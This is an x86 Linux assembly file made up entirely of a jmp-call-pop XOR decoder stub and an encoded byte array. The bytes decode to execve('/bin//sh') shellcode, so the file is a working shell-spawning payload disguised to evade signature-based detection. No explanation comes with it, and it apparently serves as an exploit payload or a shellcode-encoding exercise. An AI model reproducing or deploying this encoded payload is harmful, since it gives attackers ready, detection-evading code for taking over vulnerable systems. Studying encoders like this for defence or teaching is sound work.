; Purpose: 

global _start			

section .text
_start:

	jmp short call_decoder

decoder:
	pop esi
	xor ecx, ecx
	mov cl, len


decode:
	xor byte [esi], 0x88
	inc esi
	xor byte [esi], 0xdd
	inc esi
	loop decode

	jmp short Shellcode



call_decoder:

	call decoder
	Shellcode: db 0xb9,0x1d,0xd8,0xb5,0xa7,0xf2,0xfb,0xb5,0xe0,0xf2,0xea,0xb4,0xe6,0x54,0x6b,0x8d,0x01,0x3f,0xdb,0x54,0x69,0x6d,0x83,0x10,0x08
	len equ $ - Shellcode
